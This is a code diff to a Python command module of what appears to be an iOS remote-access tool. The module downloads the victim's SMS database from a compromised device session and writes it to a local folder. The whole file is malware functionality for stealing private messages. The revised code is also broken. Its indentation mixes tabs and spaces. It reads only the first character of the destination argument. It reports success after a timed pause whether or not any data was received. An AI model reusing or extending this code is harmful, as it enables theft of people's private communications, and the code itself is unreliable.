@@ -28,13 +28,45 @@ class command:
 		self.description = "Download SMS data."
 
 	def run(self,session,cmd_data):
-		file_name = "sms.db"
-		h.info_general("Downloading {0}".format(file_name))
-		data = session.download_file('/var/mobile/Library/SMS/'+file_name)
-		if data:
-			# save to downloads
-			h.info_general("Saving {0}".format(file_name))
-			f = open(os.path.join('downloads',file_name),'w')
-			f.write(data)
-			f.close()
-			h.info_success("Saved to downloads/{0}!".format(file_name))
+		if len(cmd_data['args'].split()) < 1:
+		    print self.usage
+            	    return
+		
+		dest = cmd_data['args'][0]
+                if os.path.isdir(dest):
+                    if os.path.exists(dest):
+			 h.info_general("Downloading SMS...")
+			 data = session.download_file('/var/mobile/Library/SMS/sms.db')
+			 if data:
+			     f = open(os.path.join(dest,'sms.db'),'w')
+			     f.write(data)
+			     f.close()
+                         if dest[-1:] == "/":
+                             h.info_general("Saving to "+dest+"sms.db...")
+                             time.sleep(1)
+                             h.info_success("Saved to "+dest+"sms.db!")
+                         else:
+                             h.info_general("Saving to "+dest+"/sms.db...")
+                             time.sleep(1)
+                             h.info_success("Saved to "+dest+"/sms.db!")
+                    else:
+                        h.info_error("Local directory: "+dest+": does not exist!")
+                else:
+                    rp = os.path.split(dest)[0]
+                    if os.path.exists(rp):
+			if os.path.isdir(rp):
+			    pr = os.path.split(dest)[0]
+                            rp = os.path.split(dest)[1]
+                            h.info_general("Downloading SMS...")
+			    data = session.download_file('/var/mobile/Library/SMS/sms.db')
+			    if data:
+			        f = open(os.path.join(pr,rp),'w')
+			        f.write(data)
+			        f.close()
+                            h.info_general("Saving to "+dest+"...")
+                            time.sleep(1)
+                            h.info_success("Saved to "+dest+"!")
+                        else:
+                            h.info_error("Error: "+rp+": not a directory!")
+                    else:
+                        h.info_error("Local directory: "+rp+": does not exist!")
